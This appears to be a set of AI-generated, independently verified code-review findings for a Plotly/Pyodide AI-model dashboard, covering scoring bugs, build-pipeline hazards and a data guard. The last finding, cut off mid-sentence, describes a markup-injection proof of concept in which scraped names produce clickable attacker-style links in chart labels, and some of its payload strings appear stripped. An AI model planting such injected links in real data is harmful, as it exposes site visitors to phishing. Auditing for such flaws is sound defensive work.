title: Fast-tier composite normalizes by the max of the provider-filtered pool, so two models swap rank based on which unrelated providers are checked
evidence:
`_pick_api_tier` lines 127-134 compute `q_max`, `v_max`, `s_max` from `pool` — which is `df` already narrowed by `providers` (line 426) and by the tier's price/quality/speed floors. Because the three components are each divided by a *different* pool-dependent maximum, changing the pool changes their relative weighting, not just a common scale factor, so the ordering is not preserved.

Measured directly:
  SpaceXAI only:      Grok 4.3 (low) 0.9880 > Grok 4.3 (medium) 0.9812
  all providers:      Grok 4.3 (low) 0.3869 < Grok 4.3 (medium) 0.3876   -> RANK FLIPPED
  Top Fast pick shown for SpaceXAI alone: Grok 4.3 (low)
  Best-ranked SpaceXAI model when all are selected: Grok 4.3 (medium)

  Alibaba only:       Qwen3.6 35B A3B (Reasoning) 0.7060 > Qwen3.6 27B (Non-reasoning) 0.6980
  all providers:      Qwen3.6 35B A3B (Reasoning) 0.3531 < Qwen3.6 27B (Non-reasoning) 0.5297  -> RANK FLIPPED

This is the codebase's known "scales derived from the filtered frame" pattern: `_pick_local_tier` has the same shape at lines 155-160 (`s_max`/`q_max` taken after the VRAM and quality-floor filters).
user_impact: A user comparing Grok variants checks only xAI/SpaceXAI and is told Grok 4.3 (low) is the better Fast choice; they then check Anthropic as well to widen the comparison and the *same two Grok models* silently reorder — Grok 4.3 (medium) now outranks (low). Neither the score nor its basis is shown, so the recommendation looks arbitrary and is not reproducible.
suggested_fix: Compute `q_max`, `v_max`, `s_max` once from the full unfiltered `df` (subject only to `quality > 0 & price > 0`) and pass them into `_pick_api_tier`, so a model's composite score is a property of the model, not of the current filter state. Same treatment for `_pick_local_tier`'s `q_max`/`s_max`, which should be taken from the full catalog rather than the VRAM-filtered subset.
verify_reasoning: Tried to refute on two fronts. First, whether the flip is real: reimplemented `_pick_api_tier`'s scoring and got SpaceXAI-only Grok 4.3 (low) 0.9880 > (medium) 0.9812, all-providers (low) 0.3869 < (medium) 0.3876, and Alibaba-only Qwen3.6 35B A3B 0.7060 > Qwen3.6 27B (Non-reasoning) 0.6980 vs all-providers 0.3531 < 0.5297 — all eight scores match the finder to four decimals, and the mechanism is confirmed at components/stack_recommender.py:128-130 where q_max/v_max/s_max are each taken from the already provider-filtered `pool`. Second, whether it is user-VISIBLE: I partially refuted the stated narrative — adding Anthropic to SpaceXAI does NOT reorder the card (both give ['Grok 4.3 (low)','Grok 4.3 (medium)']), and under all-providers the Grok rows fall out of the top-5 entirely. But sweeping every single->pair transition found 7 selections where the rendered top-5 order actually flips: SpaceXAI + Google / InclusionAI / Kimi / StepFun each invert the two Grok rows on screen, and Alibaba + MiniMax / Sapiens AI / Tencent reorder the Qwen rows. So the finding stands with a different worked example. Severity medium is correct.

title: Apple bandwidth-efficiency factor (0.82) exceeds NVIDIA's (0.55), so the tool claims an M3 Ultra generates tokens 21% faster than an RTX 4090
evidence:
`_EFF` (lines 43-50): `nvidia 0.55`, `amd 0.50`, `apple 0.82`, `qualcomm 0.55`, `intel 0.50`, `cpu 0.30`. Since `calc_speed_tps` is `bandwidth * eff / active_gb`, this asserts Metal/MLX extracts 49% more of theoretical peak bandwidth than CUDA.

Same model (Llama-3.1-8B, Q4), executed:
  NVIDIA RTX 4090          eff 0.55  bw 1008 ->  117.0 tok/s
  NVIDIA RTX 3090          eff 0.55  bw  936 ->  108.7 tok/s
  Apple M3 Ultra (192 GB)  eff 0.82  bw  819 ->  141.8 tok/s
  Apple M2 Ultra (192 GB)  eff 0.82  bw  800 ->  138.5 tok/s
  Apple M4 Max (128 GB)    eff 0.82  bw  546 ->   94.5 tok/s
  => tool claims M3 Ultra = 1.21× an RTX 4090; M2 Ultra = 1.18× an RTX 4090.

The NVIDIA calibration is sound (117 predicted vs ~120-140 measured for llama.cpp on a 4090). Back-solving the Apple factor from published mlx-lm figures on M3 Ultra (~65-80 tok/s for Llama-3-8B 4-bit against 819/4.74 = 172.8 tok/s theoretical) gives eff ≈ 0.38-0.46, not 0.82 — i.e. the Apple predictions are roughly 1.8-2.2× high, and the cross-vendor ordering is inverted.
user_impact: A user choosing hardware on the Run Local tab is told a Mac Studio out-runs an RTX 4090 on the same quantized model. Every Apple preset — 60 of the 137 rows in GPUS — carries a tokens/sec figure roughly double reality, and the Agent Stack local tiers rank Apple configurations accordingly.
suggested_fix: Recalibrate `_EFF["apple"]` against mlx-lm / llama.cpp Metal measurements (~0.45-0.55) rather than leaving it above the NVIDIA figure, and record the benchmark each constant was fit to in the comment block at lines 38-42 so the numbers can be re-verified.
verify_reasoning: The code behaviour reproduces exactly; the 'wrong constant' claim does not survive as executed fact. Confirmed `_EFF` (data/local_models.py:43-50) = {'nvidia':0.55,'amd':0.5,'apple':0.82,'qualcomm':0.55,'intel':0.5,'cpu':0.3} and ran calc_speed_tps for an 8.03B model at Q4: RTX 4090 (1008 GB/s) 117.0 tok/s, RTX 3090 (936) 108.7, Apple M3 Ultra 192 GB (819) 141.8, M2 Ultra 192 GB (800) 138.5, M4 Max 128 GB (546) 94.5 — every figure matches the finder, so the tool does assert M3 Ultra = 1.21× a 4090. Refuted one supporting number: Apple presets are 56 of 137, not 60. Crucially, the claim that 0.82 is the WRONG value rests entirely on published mlx-lm/llama.cpp measurements ('back-solving gives 0.38-0.46') that I cannot run in this environment — there is no in-repo benchmark, fixture or test pinning these constants (the only justification is the free-text comment at lines 39-42, which cites no source for the 0.82). The cross-vendor inversion is suspicious and the direction is likely right, but nothing here proves it. Severity medium is right — it is an estimate on an explicitly 'estimated' tab, affecting 56/137 presets.

title: Pre-rendered figures and the in-browser Pyodide render disagree on provider order, because the build machine's pandas breaks value_counts() ties differently from Pyodide's pinned pandas
evidence:
spotlight_split orders the legend/trace series by `out["_canon_provider"].value_counts()` (constants.py:432-433). After dedupe_to_best_variant the top providers tie: OpenAI 8, Google 8, Mistral 8 (and Google/NVIDIA tie at 9 pre-dedupe). value_counts() does not define tie order, and it changed between pandas majors. Running the identical code path on the same CSV under two interpreters:
  ./ai-frontier/bin/python (pandas 3.0.1) -> ordered: ['Alibaba','NVIDIA','OpenAI','Google','Mistral','Anthropic','Amazon','Meta','DeepSeek','Other']
  miniforge python (pandas 2.2.2)        -> ordered: ['Alibaba','NVIDIA','Mistral','Google','OpenAI','Anthropic','Amazon','Meta','DeepSeek','Other']
The committed docs/figures/pareto.json carries the pandas-3 order; rendering the same default state through static_api.update_overview([],0,"","price") under pandas 2.2.2 yields the pandas-2 order, and `pre == live` is False. requirements.txt:3 pins only `pandas>=2.0.0`, so the CI builder (.github/workflows/refresh.yml runs `pip install -r requirements.txt`) resolves to pandas 3.x, while the browser runtime is fixed: docs/pyworker.js:13 pins Pyodide v0.27.7, whose pyodide-lock.json (fetched) ships pandas 2.2.3. The two sides therefore disagree structurally on every publish. (I verified 2.2.2, not 2.2.3 itself; both are the same 2.2.x tie-break family.)
user_impact: A visitor opens the Overview tab, sees the pre-painted Pareto chart with OpenAI drawn/legended third; ~4-5s later the Pyodide worker signals ready and app.js:280 calls rerenderActiveFilterCharts() with no user action, and the legend reshuffles to put Mistral third and OpenAI fifth, changing which bubbles are drawn on top of which. Nothing in the data changed. The same reshuffle hits the Quadrant chart.
suggested_fix: Make the ordering total instead of leaving it to the library: in spotlight_split, sort by (-count, provider_name) — e.g. `named = sorted((p for p in counts.index if p in SPOTLIGHT_PROVIDERS), key=lambda p: (-counts[p], p))[:MAX_LEGEND_PROVIDERS]`. Also pin pandas in requirements.txt to the version Pyodide ships (pandas==2.2.3) so the pre-render and the browser run the same library, and add a test that asserts a pre-rendered figure equals the static_api render at default filter state.
verify_reasoning: I tried to kill this three ways and failed on all three. (1) Tie existence: `./ai-frontier/bin/python -c "from data.ingest import get_models; from components.charts.constants import spotlight_split, dedupe_to_best_variant; ..."` gives dedupe counts OpenAI 8 / Google 8 / Mistral 8 and Amazon 4 / Meta 4 — real ties. (2) The finder only tested pandas 2.2.2, not the 2.2.3 Pyodide actually ships, so I built a clean venv with `pandas==2.2.3` and re-ran the identical path: ordered = ['Alibaba','NVIDIA','Mistral','Google','OpenAI','Anthropic','Amazon','Meta','DeepSeek','Other'], versus ['Alibaba','NVIDIA','OpenAI','Google','Mistral',...] under the repo venv's pandas 3.0.1. Same swap. (3) I checked the runtime pin rather than trusting it: `curl https://cdn.jsdelivr.net/pyodide/v0.27.7/full/pyodide-lock.json` -> pandas 2.2.3 (docs/pyworker.js:13 pins v0.27.7). The committed docs/figures/pareto.json and quadrant.json carry the pandas-3 order ['Alibaba','NVIDIA','OpenAI','Google','Mistral',...], and .github/workflows/refresh.yml runs `pip install -r requirements.txt` (requirements.txt:3 = pandas>=2.0.0, resolves to 3.x) then `build_static.py --data-only`, which DOES call export_default_figures (build_static.py:243). docs/app.js:17 defaults tab to "overview" and app.js:272-274 calls rerenderActiveFilterCharts() on the worker 'ready' message with no user action, which hits app.js:669 update_overview -> build_pareto_scatter. So the reshuffle is real and unavoidable on every page load. TWO CORRECTIONS that reduce impact: (a) MAX_LEGEND_PROVIDERS = len(SPOTLIGHT_PROVIDERS) = 9 (constants.py:227), so the `[:MAX_LEGEND_PROVIDERS]` slice at constants.py:433 can never truncate — the SET of named providers is identical under both pandas, only the order changes; (b) colour is looked up per provider name via PROVIDER_COLORS.get(provider) (pareto.py:69), so no model changes colour or symbol. The finder's 'including marker/color, marker/symbol' is only true in the trivial sense that trace indices 2 and 4 swapped wholesale. Net user-visible effect: legend entries 3 and 5 swap ~4-5s after load, and bubble z-order changes. Cosmetic instability, not wrong data — hence severity down from high to medium.

title: Running the test suite rebuilds the real docs/ output directory and dirties the repo
evidence: Three tests shell out to the real build with the repo as cwd — `subprocess.run([sys.executable, "build_static.py"], cwd=ROOT, check=True)` at lines 33, 47 and 56, plus `--data-only` at line 63 — and build_static.py hardcodes DOCS = ROOT/"docs" (build_static.py:41). The tests accept a `tmp_path` fixture (line 31) but never use it. Observed: `git status` was clean at session start; after the orchestrator ran `./ai-frontier/bin/python -m pytest tests/ -q`, `git status --porcelain` reports ` M docs/figures/manifest.json` and ` M docs/pybundle.zip`, and every file in docs/figures/ now has mtime 2026-08-12 23:12:44 (the pytest run). The 4MB pybundle.zip diff is pure churn: I unzipped HEAD's blob and the worktree copy — identical member set, zero members with differing bytes, only member ORDER changed (the 3 CSVs moved to the end, because swap_bundle_csvs at build_static.py:230-231 appends them after passing everything else through).
user_impact: A maintainer runs pytest to check a change; the suite silently overwrites the published site artifacts with whatever the ambient interpreter produces, then CLAUDE.md's 'commit and push after EVERY successful change' mandate pushes them. A test run under a different pandas would republish the whole figure set with reordered traces (see the tie-break finding) — a live site change nobody authored — and every run re-pushes 4MB of identical-content zip.
suggested_fix: Give build_static an output-root parameter (or honour an env var) and point these tests at tmp_path, asserting on the artifacts there. Make swap_bundle_csvs preserve original member order (write the fresh CSV at the position where the stale one was removed) so a no-op refresh produces byte-identical output.
verify_reasoning: I did not re-run pytest (read-only mandate) but the evidence of the orchestrator's run is still on disk and I verified it independently. `git status --porcelain` -> ' M docs/figures/manifest.json' and ' M docs/pybundle.zip'; `ls -lT docs/figures/` shows all 14 JSONs stamped Aug 12 23:44:51 2026. I diffed the manifest against HEAD myself: only {version, generated, generated_iso} changed, 20260811T233029Z -> 20260813T035135Z — i.e. a genuine export_default_figures run, not an edit. I unzipped HEAD's pybundle.zip blob and the worktree copy: 1665 members each, `set(names) equal: True`, `names equal (order): False`, `members with differing bytes: 0` — exactly the pure member-order churn the finder described, caused by swap_bundle_csvs (build_static.py:222-233) appending the 3 CSVs after passing everything else through. The tests are gated `@needs_lean_plotly` (tests/test_build_static.py:23-27) and the repo venv has plotly 6.5.2, so the gate opens; lines 33/47/56/63 shell out with `cwd=ROOT` and build_static.py:41-42 hardcodes DOCS=ROOT/'docs'; the tmp_path fixture at line 31 is accepted and never used. Severity down from high to medium: the republished figures describe the same dataset, so nothing user-facing goes wrong on its own — the harm is 4MB of git churn per test run (compounding the bloat finding) and an unauthored site republish, which only becomes visibly wrong when combined with the pandas tie-break.

title: build_static.py main() overwrites every published figure before it validates the toolchain, so a rejected build still mutates docs/
evidence: main() runs export_default_figures(FIG) (line 248), copy_css() (249) and writes .nojekyll (250) BEFORE build_pybundle() (251), and the only environment validation lives inside build_pybundle -> _assert_lean_plotly (line 176/115-131). I proved the failure path is live on this machine: `build_static._assert_lean_plotly(Path('/Users/avosarkissian/miniforge3/lib/python3.10/site-packages/plotly'))` raises `RuntimeError: plotly at ... ships 13329 generated validator modules (>500)`. Yet export_default_figures completes fine under that same interpreter — I ran it with miniforge python (plotly 6.0.0, pandas 2.2.2) into a scratch dir and all 13 figure JSONs + manifest were written successfully, and they differ from the committed ones: pareto.json and quadrant.json differ SEMANTICALLY (traces 2 and 4 swapped, Mistral<->OpenAI, including marker/color, marker/symbol, x/y/customdata), the rest differ only in serialization. So the sequence is: 13 figure JSONs replaced -> style.css replaced -> RuntimeError -> non-zero exit, with pybundle.zip left at the previous build's code and manifest.json (which carries the `version` cache key read by app.js:187 and pyworker.js) never bumped.
user_impact: A maintainer follows README.md:100-105, gets the wrong interpreter (see the activate finding), runs `python build_static.py`, sees a traceback and assumes nothing happened. docs/ now holds figures rendered by a different plotly/pandas than the vendored bundle, with a stale manifest version so no client is told to reload. With the project's auto-commit-and-push rule, that half-state ships: pre-painted charts drawn one way, the Pyodide re-render another, and the stat tiles/quality presets in the stale manifest describing the previous dataset.
suggested_fix: Validate the environment first: call _assert_lean_plotly (and a pandas-version check) at the top of main() before any write. Better, build into a staging directory and atomically swap it into docs/ only after every step succeeds, so a failed build leaves the published directory untouched.
verify_reasoning: Core claim reproduced, one sub-claim refuted. Ordering in main() is as stated: export_default_figures(FIG) at build_static.py:248, copy_css() 249, .nojekyll 250, build_pybundle() 251; the only env validation is _assert_lean_plotly, called at build_static.py:176 from inside build_pybundle. I executed both halves. Half one: `./ai-frontier/bin/python -c "import build_static; build_static._assert_lean_plotly(Path('/Users/avosarkissian/miniforge3/lib/python3.10/site-packages/plotly'))"` -> RuntimeError: 'plotly ... ships 13329 generated validator modules (>500)'. Half two: I ran `/Users/avosarkissian/miniforge3/bin/python` (plotly 6.0.0 / pandas 2.2.2) calling build_static.export_default_figures into a scratch dir — it completed, wrote all 13 figure JSONs plus manifest.json, and pareto.json came out in the pandas-2 order ['Alibaba','NVIDIA','Mistral','Google','OpenAI',...], differing from the committed file. So yes: 13 figures replaced, then RuntimeError, then non-zero exit. REFUTED sub-claim: 'manifest.json ... never bumped'. export_default_figures writes manifest.json itself (build_static.py:99) with version=_now.strftime, and my scratch run produced version 20260813T035106Z. The manifest IS bumped on every run, so clients ARE told to reload — which makes the finder's stated mechanism ('no client is told to reload', 'stale manifest describing the previous dataset') backwards. The real half-state is: fresh figures + fresh manifest version + stale pybundle.zip. Severity down from high to medium: the defect (writes before validation, no atomic staging) is real and the traceback genuinely hides it, but the damage is bounded — the figures are regenerated from the same CSVs and the manifest is consistent with them.

title: `source ai-frontier/bin/activate` silently activates nothing — VIRTUAL_ENV path has a stray space, so python/pip resolve to a conda install with the wrong plotly and pandas
evidence: Line 41 reads VIRTUAL_ENV="/Users/avosarkissian/Documents/School/Northeastern/NU 25-26 /Spring 2026/Data Visualization/AI Frontier/ai-frontier" — note "NU 25-26 /Spring"; the real directory is "NU 25-26/Spring". ai-frontier/pyvenv.cfg carries the same corrupted path in its `command` key (od -c confirms `N U   2 5 - 2 6   / S p r i n g`). Because $VIRTUAL_ENV/bin does not exist, the PATH prepend at activate:44 is a no-op, but the script still exits 0 and still sets the (ai-frontier) prompt. Measured after sourcing it: `which python` -> /Users/avosarkissian/miniforge3/bin/python, `which pip` -> /Users/avosarkissian/miniforge3/bin/pip, sys.prefix -> /Users/avosarkissian/miniforge3, python 3.10.14, plotly 6.0.0, pandas 2.2.2. The actual venv (./ai-frontier/bin/python) is 3.11.5 / plotly 6.5.2 / pandas 3.0.1. README.md:102 documents exactly this command, and README.md:105/121 tell the user to then run `pip install -r requirements.txt` and `python build_static.py`.
user_impact: Anyone following the README on this checkout installs dependencies into their base conda environment (never into the venv) and then runs the build with plotly 6.0.0/pandas 2.2.2 — which regenerates docs/figures with different trace ordering and then aborts on the plotly guard, leaving docs/ half-updated. suggested_fix: Recreate the venv (`rm -rf ai-frontier && python3.11 -m venv ai-frontier && ai-frontier/bin/pip install -r requirements.txt`). Add a guard at the top of build_static.py that refuses to run unless sys.prefix is the project venv (or at least prints the interpreter, plotly and pandas versions it is building with), so a wrong-interpreter build is loud instead of half-silent.
verify_reasoning: Reproduced exactly. ai-frontier/bin/activate:41 reads VIRTUAL_ENV="/Users/.../NU 25-26 /Spring 2026/..." and ai-frontier/pyvenv.cfg's `command` key carries the same 'NU 25-26 /Spring'. I ran `bash -c 'source ai-frontier/bin/activate; echo exit=$?; which python; python -c "import sys;print(sys.prefix, sys.version.split()[0])"; python -c "import plotly,pandas;print(plotly.__version__, pandas.__version__)"'` -> exit=0, VIRTUAL_ENV set to the corrupted path, `which python` -> /Users/avosarkissian/miniforge3/bin/python, sys.prefix=/Users/avosarkissian/miniforge3, 3.10.14, plotly 6.0.0, pandas 2.2.2. The real venv (./ai-frontier/bin/python) is 3.11.5 / plotly 6.5.2 / pandas 3.0.1. Sourcing succeeds silently and still sets the (ai-frontier) prompt. Severity down from high to medium on one ground the finder overstated: `git check-ignore -v ai-frontier/bin/activate` -> '.gitignore:18: ai-frontier/' and `git ls-files ai-frontier` is empty, so the corrupt venv is NOT in the repo. A fresh clone following README.md:100-101 runs `python -m venv ai-frontier` and gets a working activate. The blast radius is this one machine — which happens to be the machine that publishes the site, so it is still worth fixing, but it is not 'anyone following the README'.

title: The hourly refresh rewrites and re-commits the whole 4MB pybundle.zip to change 55KB of CSVs; 97% of the repo's history is now that one file
evidence: rebuild_data_only -> swap_bundle_csvs (build_static.py:217-236) rebuilds docs/pybundle.zip in full on every data refresh, and .github/workflows/refresh.yml commits `docs` wholesale. The three CSVs it swaps total 55,514 bytes (aa_models 14,133 + aa_local_models 8,334 + aa_image_models 33,047) inside a 4,040,968-byte zip — a 73x write amplification, and because the contents are already DEFLATEd git cannot delta them. Object accounting over `git rev-list --objects --all`: total blob bytes across history 2796.6 MB, of which docs/pybundle.zip is 2723.8 MB across 314 versions (the next largest path is 8.2 MB). 314 of 468 commits touch it. On-disk: `git count-objects -vH` reports size 190.69 MiB loose + size-pack 75.15 MiB. The bot has produced 291 hourly refresh commits, running at 12-14/day in the last few days.
user_impact: Cloning the dashboard repo already pulls ~265MB for a project whose actual source is a few hundred KB, and it grows by roughly 4MB every hour the upstream data moves — CI checkout time, GitHub storage and every contributor's clone degrade indefinitely.
suggested_fix: Stop shipping the CSVs inside the zip. Emit them as docs/data/*.csv, have the Pyodide bootstrap fetch them with the manifest's ?v= cache key and write them into /bundle before `import static_api`. pybundle.zip then changes only when code or plotly changes (a handful of times per month) and the hourly commit is ~55KB of text git can delta.
verify_reasoning: Every number re-derived independently and they land on the finder's figures. `stat -f %z` on the three CSVs: 14133 + 8334 + 33047 = 55,514 bytes, inside a 4,040,968-byte docs/pybundle.zip -> 72.8x write amplification, and the zip members are DEFLATEd so git cannot delta them (my member-by-member comparison in the pytest finding proves a no-op refresh still produces a byte-different file — only member order moved). Object accounting via `git rev-list --objects --all | git cat-file --batch-check` and awk: total blob bytes 2667.1 MiB, docs/pybundle.zip 2597.6 MiB across 314 versions = 97.4% of all blob bytes. Those are MiB; converting to the decimal MB the finder used gives 2796 / 2723.8 MB — his numbers exactly. `git rev-list --count --all` = 468 commits, 314 of which touch the bundle. `git count-objects -vH` -> size 190.69 MiB loose, size-pack 75.15 MiB. `git log --grep='hourly AA refresh' | wc -l` = 291, and by date: 12 on 2026-08-10, 14 on 2026-08-11. Confirmed as measured; refresh.yml does `git add -- data/raw docs` and build_static.py:243 (rebuild_data_only) calls swap_bundle_csvs on every refresh. Severity medium stands — it is repo/CI hygiene, invisible to a site visitor, but it compounds monotonically.

title: `--data-only` refreshes the pre-rendered figures from new chart code but leaves the in-browser Python stale, so a chart fix can be published half-applied
evidence:
refresh.yml:60 only ever runs `python build_static.py --data-only`, i.e. `rebuild_data_only()` (build_static.py:239-244): `export_default_figures(FIG)` + `copy_css()` + `swap_bundle_csvs()`. `export_default_figures` imports the chart builders from the working tree (build_static.py:12-23), so docs/figures/*.json are regenerated with whatever chart code is on main. `swap_bundle_csvs()` (build_static.py:224-231) skips only `DATA_CSVS` and passes every other member through byte-for-byte — `build_pybundle()` is never called. tests/test_build_static.py:test_data_only_swaps_csvs_and_preserves_plotly asserts exactly this: after --data-only, `z.read(sample_py) == before[sample_py]`.

refresh.yml is the only workflow in .github/workflows/, so nothing in CI ever re-vendors the bundle's Python. The static site loads the pre-rendered figure first and re-renders through Pyodide (running pybundle.zip's copy) the moment a filter changes (docs/app.js:265-289, 453+).

I verified there is no drift *right now* — 31 project .py files in docs/pybundle.zip, 0 differ from the working tree — because commit b9d6e19 "build: regenerate bundle and figures" was a manual full build. The hazard is that CI cannot produce that state on its own.
user_impact: A maintainer pushes a chart fix (e.g. the recent "stop truncated model names sharing a row") but forgets the full `python build_static.py`. Within the hour the bot regenerates docs/figures with the fixed code, so the default view looks correct — then the first time a visitor touches a provider filter or quality slider, Pyodide re-renders from the stale bundled code and the chart visibly reverts to the broken layout. The fix appears to have landed and then to un-land on interaction, with nothing logged.
suggested_fix: Add a cheap staleness assertion to the refresh job: hash the project .py members inside docs/pybundle.zip against the working-tree files and fail the run (or fall back to a full `python build_static.py`) when they differ. The comparison is ~31 files and costs milliseconds; the full rebuild only needs to happen on the rare runs where source actually moved.
verify_reasoning:
Tried to refute by finding a guard: no second workflow exists (`ls .github/workflows/` -> refresh.yml only), no git hooks (`ls .git/hooks | grep -v sample` -> empty), and no test asserts bundle freshness (grep pybundle tests/ hits only the size-budget and missing-file tests). Confirmed there is no drift today: 31 project .py members in docs/pybundle.zip, 0 differ from the working tree.

Then reproduced the hazard end to end rather than reading it. Copied data/ components/ docs/ assets/ + build_static.py/static_helpers.py/static_api.py into the scratchpad, made a visible chart edit (_ZONE in components/charts/quadrant.py -> rgba(255,0,0,0.99)), and ran the exact command refresh.yml:60 runs, `python build_static.py --data-only`. Result:
  docs/figures/quadrant.json layout.shapes fillcolor -> {'rgba(255,0,0,0.99)', None}   (NEW code)
  docs/pybundle.zip components/charts/quadrant.py    -> _ZONE = "rgba(255,255,255,0.02)" (OLD code)
So the pre-rendered default view and the Pyodide re-render (docs/pyworker.js loads pybundle.zip; docs/app.js re-renders on filter change) genuinely diverge after a data-only rebuild. Severity medium is right — it needs a maintainer to skip the full build, but CI can never self-correct it.

title: data_guard compares each scrape only against HEAD, so a compounding shrink walks the catalogue from 148 to 50 rows across five consecutive green runs
evidence:
`check()` computes `before = committed_rows(path, rev)` with `rev="HEAD"` (data_guard.py:78, default at :66) and flags only `drop_pct > 20` versus that single previous commit (data_guard.py:83-88). refresh.yml:57 invokes it with no `--rev`, and since the bot commits every run, HEAD is *the previous hour*. There is no multi-day baseline and no absolute-change budget over time.

Arithmetic on the real dataset: 148 -> 119 -> 96 -> 77 -> 62 -> 50 is five consecutive 19-20% drops, each individually under the limit, each publishing green. The only backstop is `MIN_ROWS = 50` (data_guard.py:36), so the worst silent loss is 148 -> 50, a 66% contraction, reachable inside five hourly runs. For aa_local_models.csv (97 rows today) the floor allows a silent 48% loss.

The module's own docstring (data_guard.py:1-15) says it exists because a 329 -> 155 single-step drop "published it unremarked and the dashboard's headline model count halved without anyone noticing for weeks" — a slow bleed reproduces that outcome exactly, and the archived daily snapshots show the catalogue genuinely does move in the tens (160 on 2026-08-04, 152 on 2026-08-05, 148 on 2026-08-11).
user_impact: Upstream deprecates models in waves over a few hours (or a parser regression drops a subset each run). The dashboard's "Models tracked" tile walks down from 148 toward 50, entire providers vanish from the filter list, and the Pareto frontier reshapes — with every run green and the badge saying "Updated just now". Nobody investigates because nothing ever failed.
suggested_fix: Keep the hour-over-hour check but add a second baseline: compare against the row count from ~24 h ago (the committed data/raw/history snapshot is already there for aa_models.csv, or `git rev-list -1 --before='24 hours ago' main`) with a tighter cumulative budget, e.g. fail if the 24 h drop exceeds 25%. Raise MIN_ROWS from the legacy 50 to something proportional to the current catalogue (e.g. 60% of the 7-day median).
verify_reasoning:
Tried to refute by checking whether refresh.yml passes a longer baseline or whether the history archive is used as one. It does not: refresh.yml:57 is `python data_guard.py` with no --rev, and check()'s rev defaults to 'HEAD' (data_guard.py:66,78); DATA_CSVS (data_guard.py:29-33) lists only the three top-level CSVs.

Then executed the compounding scenario instead of arguing about it. Built a throwaway git repo in the scratchpad with data_guard.py and the three real CSVs, then truncated aa_models.csv by ~19% and committed once per simulated hourly run:
  run 1: 148 -> 119  exit 0 PASS
  run 2: 119 ->  96  exit 0 PASS
  run 3:  96 ->  77  exit 0 PASS
  run 4:  77 ->  62  exit 0 PASS
  run 5:  62 ->  50  exit 0 PASS
  run 6:  50 ->  41  exit 1 FAIL (only because MIN_ROWS=50 finally trips)
Exactly the claimed 148 -> 50 (66% loss) across five green runs. Severity medium stands: it requires a compounding upstream shrink, but catching precisely that is the module's stated purpose (data_guard.py:1-15).

title: Scraped model/provider names are injected unescaped into Plotly rendered-text sinks (hovertemplate, legend, tick labels, annotations, treemap labels)
evidence:
Every HTML sink in this app is escaped (I verified this empirically), but the Plotly text path is not escaped anywhere. radar.py:109 interpolates the raw scraped name straight into a hovertemplate string: `f"{model_name}
"`, and radar.py:107 puts it in the trace `name` (legend). Probe (poisoned _DF, model renamed to `P`, run via `PYTHONPATH=. ./ai-frontier/bin/python`): == rankings RENDERED-TEXT sinks: ['.data[0].y[24]', '.data[1].y[24]', '.layout.annotations[24].y'] == radar RENDERED: ['.data[0].hovertemplate', '.data[0].name'] hovertemplate = P
Intelligence: 90%
Speed: 2%
Aff trace name = P A second probe with a poisoned *provider* string showed the same for treemap (`.data[0].labels[32]`, from treemap.py:36 `labels=agg["provider"]`), provider_leaderboard (`.data[0].y[31]`, `.data[1].y[31]`, `.data[2].y[31]`, from provider_leaderboard.py:66 `y=agg["provider"]`) and rankings (`.layout.annotations[23].text`, from rankings.py:135 `text=f"{row['provider']}{price_tag}"`). Same class at rankings.py:64, pareto.py:133, quadrant.py:179, video_chart.py:247, value.py:73, cost_calc.py:95. I downloaded the exact pinned bundle (`curl https://cdn.plot.ly/plotly-3.0.1.min.js` -> HTTP 200, 4.65 MB) and read its text renderer: the allowed-tag table is `Hne={sup,sub,s,u,b,i,a,span,em}` and `convertToTspans` builds a real SVG `` element for `a` tags. So these strings are parsed as markup, not shown literally. Script execution is blocked: the href protocol allowlist is `Une=["http:","https:","mailto:","",undefined,":"]` (no `javascript:`), and the one `onclick` path (`popup=` attr) is both charset-limited to `[\w=,]*` and blocked by the page CSP, which has no `unsafe-inline` in script-src. The committed data is currently clean (0 cells with `<>&"'` across aa_models.csv 148 rows, aa_image_models.csv 148 rows, aa_local_models.csv 97 rows), so this is latent, not currently firing.
user_impact: A model creator who gets a model listed on Artificial Analysis with a name like `Foo Verified pricing →` (or the AA feed itself being compromised) causes the dashboard to render a live, clickable hyperlink to an attacker site inside the Rankings y-axis, the Compare legend and tooltip, the Landscape treemap tiles, and the provider leaderboard — styled as if it were part of AI Frontier. A visitor reading the chart clicks what looks like a chart label and lands on the attacker's page in a new tab. `` also lets the same string restyle chart text (e.g. paint a competitor's row in the background colour so it disappears).
suggested_fix: Escape at the single choke point where scraped text becomes display text: in `components/charts/constants.py`, make `clean_model_name()` (and add a matching `clean_provider_name()`) HTML-escape `<`, `>` and `&` after truncation, and route every `text=`, `labels=`, `y=<name column>`, `name=` and annotation `text=` through it. For radar.py:107-109 stop interpolating the name into the template at all — move it to `customdata` and use `%{customdata[0]}` like pareto.py:70 and treemap.py:27 already do (that also removes the `%{...}` directive-injection surface). Add a test mirroring tests/test_static_api.py::test_raw_table_escapes_scraped_names that asserts no figure JSON contains a raw `<` originating from a data column.
verify_reasoning:
Tried to refute three ways and failed on all three. (1) Re-ran the probe myself with the project venv: `PYTHONPATH=. ./ai-frontier/bin/python` loading data.ingest.get_models() (148 rows), renaming the top-quality model and its provider to `P`, then calling the real builders. Output sinks containing the raw payload: radar `.data[0].hovertemplate` = `P
Intelligence: 90%...` and `.data[0].name` (components/charts/radar.py:107 name=, :109 f"{model_name}
"); rankings `.data[0].y[24]`, `.data[1].y[24]`, `.layout.annotations[24].text` and `.y`; treemap `.data[0].labels[32]`; provider_leaderboard `.data[0].y[32]`, `.data[1].y[32]`, `.data[2].y[32]`, `.layout.annotations[32].text`. (2) Looked for a missed guard: components/charts/constants.py:21 clean_model_name() only does regex abbreviation + 32-char truncation, no escaping; `grep -rn html.escape --include=*.py` outside the venv hits ONLY static_api.py:97-99 and :195-197 (the HTML table/detail panel), never the figure path; docs/app.js escapeHtml (line 24-29) is likewise only for innerHTML, and docs/app.js:181/442 hand figure JSON straight to Plotly.react with no sanitisation. (3) Tried to prove Plotly renders it literally: downloaded the exact pinned bundle (curl https://cdn.plot.ly/plotly-3.0.1.min.js -> 200, 4,653,932 bytes), confirmed the tag table `...a:"cursor:pointer",span:"",em:...` and the href protocol allowlist `["http:","https:","mailto:","",void 0,":"]`, then rendered a page against that local bundle in a real browser (Playwright) with the payload in a y tick label, a legend name, an annotation and a treemap label. Result: 4 live anchors, `href="//e.co"`, textContent `CLICKME`, located at `ytick|yaxislayer-above`, `legendtext|traces|legend`, `annotation-text|cursor-pointer|annotation`, and `slicetext|slice cursor-pointer|trace treemap`. So the payload is parsed as markup and produces real clickable links in exactly the sinks named. No script execution is possible (no javascript: in the protocol allowlist; script-src in docs/index.html:18 has no 'unsafe-inline'), so this is markup/phishing injection, not XSS — the category label is wrong but the defect is real. Latent only: current 